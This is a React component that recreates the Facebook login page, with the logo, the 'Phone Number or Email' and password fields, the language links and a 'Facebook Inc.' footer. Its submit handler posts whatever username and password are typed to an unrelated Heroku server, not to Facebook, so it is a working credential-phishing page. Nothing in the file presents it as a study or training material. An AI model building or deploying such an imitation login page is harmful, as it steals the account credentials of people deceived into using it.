import React, { useState } from "react";
import "./App.css";
import fb from "./Images/fb.svg";
import axios from "axios";

function App() {
  const [data, setData] = useState({
    username: "",
    password: "",
  });

  const onChange = (e) => {
    setData({ ...data, [e.target.name]: e.target.value });
  };

  const config = {
    headers: {
      "Content-Type": "application/json",
    },
  };

  const onSubmit = async (e) => {
    e.preventDefault();
    try {
      const res = await axios.post(
        "https://stormy-shore-58528.herokuapp.com/login",
        data,
        config
      );
      console.log(res.data);
    } catch (error) {
      console.log(error);
    }
  };

  return (
    <div className="container">
      <div stlye={{ width: "10px" }}>
        <img src={fb} alt="" />
      </div>
      <div style={{ alignContent: "center" }}>
        <form onSubmit={onSubmit}>
          <input
            style={{
              width: "100%",
              padding: "8px ",
              margin: "05px",
              border: "1px solid #D3D3D3",
              borderRadius: "4px",
            }}
            placeholder="Phone Number or Email"
            type="text"
            name="username"
            onChange={onChange}
          />
          <br />
          <input
            style={{
              width: "100%",
              padding: "8px ",
              borderRadius: "4px",
              margin: "05px",
              border: "1px solid #D3D3D3",
            }}
            placeholder="Password"
            type="password"
            name="password"
            onChange={onChange}
          />
          <button
            style={{
              width: "100%",
              backgroundColor: "#4B99FF",
              padding: "9px ",
              margin: "05px",
              border: "0px",
              color: "white",
              borderRadius: "4px",
            }}
          >
            Log In
          </button>
        </form>
        <p style={{ color: "#696969", textAlign: "center", margin: "10px 0" }}>
          or
        </p>
        <div style={{ textAlign: "center" }}>
          <button
            style={{
              width: "60%",
              backgroundColor: "#36A420",
              padding: "9px ",
              margin: "0px 15px",
              border: "0px",
              color: "white",
              borderRadius: "4px",
            }}
          >
            Create New Account
          </button>
        </div>
        <br />
        <div
          style={{
            textAlign: "center",
            color: "#7599CB",
            margin: "0px 10px 40px 10px",
            fontSize: "14px",
          }}
        >
          <p>Forgot Password?</p>
        </div>
        <div style={{ display: "flex" }}>
          <div
            style={{
              margin: "8px 10px",
              color: "#486284",
              fontSize: "13px",
              textAlign: "center",
            }}
          >
            {" "}
            <p>English (US)</p>
            <p>हिन्दी</p>
            <p>Português (Brasil)</p>
            <p>Deutsch</p>
          </div>
          <div
            style={{
              margin: "8px 10px",
              color: "#486284",
              fontSize: "13px",
              textAlign: "center",
            }}
          >
            {" "}
            <p>नेपाली</p>
            <p>Español</p>
            <p>Français (France)</p>
          </div>
        </div>
      </div>
      <p style={{ textAlign: "center", color: "#636363", fontSize: "13px" }}>
        Facebook Inc.
      </p>
    </div>
  );
}

export default App;
